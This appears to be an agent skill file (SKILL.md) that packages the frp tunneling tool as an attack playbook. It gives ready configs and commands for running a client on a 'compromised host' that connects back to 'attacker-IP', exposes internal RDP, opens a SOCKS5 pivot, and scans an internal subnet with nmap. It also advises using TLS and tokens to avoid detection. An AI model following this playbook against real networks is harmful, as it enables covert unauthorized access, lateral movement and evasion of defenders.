---
name: frp-tunnel
description: "frp tunnels client SOCKS5 traffic across internal segments. Signals: internal tunneling, tunnel, start server on attacker, start client on compromised host, enable TLS, prevent plaintext traffic."
zh-signals: "frp: 客户端起 SOCKS5 打穿整个内网段。信号:内网穿透,隧道,启动服务端(攻击机),启动客户端(已控内网机),开启 TLS,防流量明文。"
when-to-use: >-
  Use when you control a host inside an internal network and need a reverse tunnel
  or SOCKS5 proxy to reach internal services from the attacker machine, optionally with TLS.
---

# frp

- Attack Category: C32 Tunneling and Internal Network Pivoting
- Upstream Repository: https://github.com/fatedier/frp
- Upstream License: Apache-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
# Download the binary for your platform from Releases: https://github.com/fatedier/frp/releases
# Server frps / client frpc, no installation needed
```

## Parameter Quick Reference

| Parameter / Config | Description |
| --- | --- |
| `frps -c frps.toml` | Start the server (attacker machine) |
| `frpc -c frpc.toml` | Start the client (compromised internal host) |
| `[common] serverAddr / serverPort / token` | Client points at the server, token authentication |
| `[[proxies]] type="tcp" remotePort=6000` | Map internal port 22 to attacker machine port 6000 |
| `type="stcp"` / `type="xtcp"` | Peer-to-peer / encrypted tunnel, traffic is not relayed through the server |
| `type="tcp" plugin="socks5"` | Client starts a SOCKS5 proxy directly to pivot into the internal network |
| `transport.tls.enable=true` | Enable TLS to prevent plaintext traffic |

## Attack Scenario Playbook

### Basic reverse tunnel (internal 3389 → attacker machine 6000)

frps.toml on the attacker machine:
```toml
bindPort = 7000
auth.token = "strong-token-here"
```
frpc.toml on the compromised host:
```toml
serverAddr = "attacker-IP"
serverPort = 7000
auth.token = "strong-token-here"
[[proxies]]
name = "rdp"
type = "tcp"
localIP = "127.0.0.1"
localPort = 3389
remotePort = 6000
```
```bash
frps -c frps.toml            # attacker machine
frpc -c frpc.toml            # compromised host
rdesktop attacker-IP:6000       # connect straight from the attacker machine to the internal RDP
```

### Client-side SOCKS5 to pivot across the whole internal segment

```toml
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
plugin = "socks5"
```
```bash
proxychains nmap -sT -p 1-1000 10.0.0.0/24
```

## Notes

Configure token + TLS on the tunnel to prevent third-party takeover or detection; in multi-target scenarios give each compromised host its own remotePort; use stcp mode for heavy traffic to reduce server bandwidth.
